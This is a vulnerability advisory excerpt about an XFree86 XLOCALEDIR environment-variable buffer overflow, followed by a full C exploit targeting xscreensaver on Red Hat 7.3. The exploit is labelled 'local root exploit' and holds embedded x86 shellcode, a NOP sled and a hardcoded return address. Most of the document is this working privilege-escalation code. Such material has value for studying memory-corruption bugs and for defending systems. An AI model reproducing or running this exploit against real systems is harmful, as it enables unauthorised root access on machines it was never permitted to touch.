source: http://www.securityfocus.com/bid/7002/info
 
Several XFree86 utilities may be prone to a buffer overflow condition. The vulnerability exists due to insufficient boundary checks performed by these utilities when referencing the XLOCALEDIR environment variable.
 
A local attacker can exploit this vulnerability by setting the XLOCALEDIR environment variable to an overly long value. When the vulnerable utilities are executed, the buffer overflow vulnerability will be triggered.

/*
**
** Tested on rh 7.3 using XFree86
** xscreensaver vulnerability
** AUTHORS: Angelo Rosiello (Guilecool) & deka
** REQUIRES: X must be run!
** EFFECTS: local root exploit!
**
** deka is leet brother, thank you :>
** MAIL: guilecool@usa.com
**
*/

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define RETADDR 0xbfffdf20 //change it if u need

char shellcode[] =
 "\x55\x89\xe5\x55\x89\xe5\x83\xec\x28\xc6\x45\xd8\x2f\xc6\x45\xdc"
 "\x2f\xc6\x45\xd9\x5f\xc6\x45\xda\x5a\xc6\x45\xdb\x5f\xc6\x45\xdd"
 "\x5f\xc6\x45\xde\x5f\x83\x45\xd9\x03\x83\x45\xda\x0f\x83\x45\xdb"
 "\x0f\x83\x45\xdd\x14\x83\x45\xde\x09\x31\xc0\x89\x45\xdf\x89\x45"
 "\xf4\x8d\x45\xd8\x89\x45\xf0\x83\xec\x04\x8d\x45\xf0\x31\xd2\x89"
 "\xd3\x89\xc1\x8b\x45\xf0\x89\xc3\x31\xc0\x83\xc0\x0b\xcd\x80\x31"
 "\xc0\x40\xcd\x80";

int main()
{
        char buf[4076];
        unsigned long retaddr = RETADDR;

        memset(buf, 0x0, 4076);
        memset(buf, 0x41, 4072);
        memcpy(buf+2076, &retaddr, 0x4);
        setenv("XLOCALEDIR", buf, 1);
        memset(buf, 0x90, 4072);
        memcpy((buf+4072-strlen(shellcode)), shellcode, strlen
(shellcode));
        setenv("HAXHAX", buf, 1);
        execl("/usr/X11R6/bin/xscreensaver", "xscreensaver", 0);
}

